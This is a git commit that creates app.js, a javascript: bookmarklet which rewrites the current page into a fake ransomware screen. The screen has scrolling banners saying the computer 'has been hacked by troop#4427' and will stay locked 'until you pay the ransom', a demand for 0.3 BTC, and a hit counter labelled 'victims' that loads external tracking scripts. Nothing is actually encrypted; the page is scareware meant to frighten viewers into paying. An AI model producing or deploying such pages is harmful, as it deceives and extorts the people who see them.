c6a00bdbdcd977eed9775e5a25553bf9b151d9e0
BatatzxX <117692543+BatatzxX@users.noreply.github.com>
2022-11-07 20:27:42 -0300

    Create app.js

---
+++ app.js
@@ -0,0 +1,44 @@
+javascript:document.write('
+
+<style>
+BGarea {
+  background-color: black;
+}
+WARNalert {
+  background-color: red;
+}
+.GeneratedMarquee {
+font-family:Papyrus;
+font-size:1.5em;
+font-style:italic;
+font-weight:bold;
+font-variant:small-caps;
+line-height:1.3em;
+color:#000033;
+background-color:#990033;
+padding:1.5rem;
+margin:auto;
+}
+.GeneratedMarquee2 {
+font-family:Papyrus;
+font-size:2.5em;
+font-style:italic;
+font-weight:bold;
+line-height:1.3em;
+color:#000033;
+background-color:#990033;
+padding:2.09rem;
+margin:auto;
+}
+</style>
+<a href="https://pagerank.s12.com.br" target="_blank"><img src="https://pagerank.s12.com.br/google-pr-5cb6W1BdDwYBWcC3-9-7.gif" alt="PageRank" border="0"></a><script type="text/javascript" src="https://pagerank.s12.com.br/ad.js?id=5cb6W1BdDwYBWcC3"></script>
+<BGarea>
+<mark>
+<h1><b><marquee class="GeneratedMarquee" direction="left" scrollamount="0.5" behavior="alternate">RIP BOZO 💀🔫</marquee></b></h1>
+<marquee class="GeneratedMarquee" direction="left" scrollamount="7" behavior="alternate">Your computer has been hacked by troop#4427, your computer will be in screensaver state until you pay the ransom</marquee>
+</mark>
+<div align=center><a href='https://contador.s12.com.br'><img src='https://contador.s12.com.br/img-3Z0DwDZB78Z6y6BD-56.gif' border='0' alt='victims'></a><script type='text/javascript' src='https://contador.s12.com.br/ad.js?id=3Z0DwDZB78Z6y6BD'></script>
+<p><WARNalert>PAY 0.3 BTC TO WhuO3pPL8jDo7yDoyYlfOh1XH0KTISRWUR7suFIYNM4vkcjF</WARNalert></p>
+</BGarea>
+
+');
